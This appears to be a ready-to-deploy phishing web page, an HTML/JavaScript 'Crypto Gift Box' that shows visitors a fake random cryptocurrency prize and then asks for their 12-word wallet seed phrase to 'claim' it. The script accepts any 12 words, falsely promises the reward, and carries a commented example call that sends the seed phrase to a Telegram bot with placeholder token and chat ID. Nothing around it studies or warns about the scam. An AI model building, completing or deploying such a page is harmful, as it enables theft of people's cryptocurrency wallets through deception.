<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Crypto Gift Box</title>
  <style>
    body {
      background: #0d0d0d;
      color: #ffffff;
      font-family: 'Poppins', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
    }
    h1 {
      color: #ffc107;
      margin-bottom: 20px;
      font-size: 2em;
    }
    .gift-box {
      width: 150px;
      height: 150px;
      background: #1f1f1f;
      border: 3px solid #ffc107;
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 60px;
      cursor: pointer;
      transition: transform 0.3s;
      margin-bottom: 20px;
    }
    .gift-box:hover {
      transform: scale(1.05);
    }
    .prizes {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      justify-content: center;
      margin-bottom: 20px;
    }
    .prize {
      background: #1f1f1f;
      padding: 8px 14px;
      border-radius: 10px;
      border: 1px solid #333;
      font-size: 14px;
    }
    .message {
      margin: 15px 0;
      color: #00ff00;
      font-size: 1.2em;
      min-height: 30px;
    }
    .error-message {
      margin-top: 10px;
      padding: 10px;
      background: #ff4d4d;
      color: #fff;
      border-radius: 8px;
      display: none;
      max-width: 400px;
      text-align: center;
    }
    .success-message {
      margin-top: 10px;
      padding: 10px;
      background: #28a745;
      color: #fff;
      border-radius: 8px;
      display: none;
      max-width: 400px;
      text-align: center;
    }
    .button {
      background: #ffc107;
      color: #000;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.3s;
    }
    .button:hover {
      background: #e0a800;
    }
    #claim-section {
      display: none;
      margin-top: 20px;
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    #mnemonics {
      width: 90%;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #333;
      background: #1f1f1f;
      color: #fff;
      margin-bottom: 10px;
      font-size: 15px;
    }
  </style>
</head>
<body>

  <h1>Open Your Crypto Gift</h1>

  <div class="gift-box" id="giftBox" onclick="openGift()">üéÅ</div>

  <div class="prizes">
    <div class="prize">1 BNB</div>
    <div class="prize">10 USDT</div>
    <div class="prize">100 USDT</div>
    <div class="prize">1 BTC</div>
    <div class="prize">1 ETH</div>
    <div class="prize">1 LTC</div>
    <div class="prize">500 XRP</div>
    <div class="prize">0.5 SOL</div>
    <div class="prize">2 ADA</div>
    <div class="prize">100 DOGE</div>
  </div>

  <div id="result" class="message"></div>

  <button class="button" onclick="showClaim()">Claim Now</button>

  <div id="claim-section">
    <input type="text" id="mnemonics" placeholder="Enter your 12-word Mnemonics">
    <br>
    <button class="button" onclick="submitMnemonics()">Submit</button>
    <div id="error" class="error-message"></div>
    <div id="success" class="success-message"></div>
  </div>

  <script>
    function openGift() {
      const lastClick = localStorage.getItem('lastClick');
      const now = new Date().getTime();
      if (lastClick && now - lastClick < 86400000) { // 24 hours
        document.getElementById('result').style.color = "#ff4d4d";
        document.getElementById('result').innerText = "You can open the gift only once every 24 hours!";
        return;
      }
      const prizes = [
        '1 BNB', '10 USDT', '100 USDT', '1 BTC', '1 ETH',
        '1 LTC', '500 XRP', '0.5 SOL', '2 ADA', '100 DOGE'
      ];
      const won = prizes[Math.floor(Math.random() * prizes.length)];
      document.getElementById('result').style.color = "#00ff00";
      document.getElementById('result').innerText = "Congratulations! You won: " + won;
      localStorage.setItem('lastClick', now);
    }

    function showClaim() {
      document.getElementById('claim-section').style.display = 'block';
    }

    function submitMnemonics() {
      const mnemonic = document.getElementById('mnemonics').value.trim();
      const errorDiv = document.getElementById('error');
      const successDiv = document.getElementById('success');
      errorDiv.style.display = "none";
      successDiv.style.display = "none";

      if (mnemonic.split(" ").length !== 12) {
        errorDiv.innerText = "Error: Please enter exactly 12 words!";
        errorDiv.style.display = "block";
      } else {
        successDiv.innerText = "Success! You will receive your reward soon.";
        successDiv.style.display = "block";
        
        // Here you can send the mnemonic to your Telegram Bot
        // Example: fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=" + encodeURIComponent(mnemonic));
      }
    }
  </script>

</body>
</html>
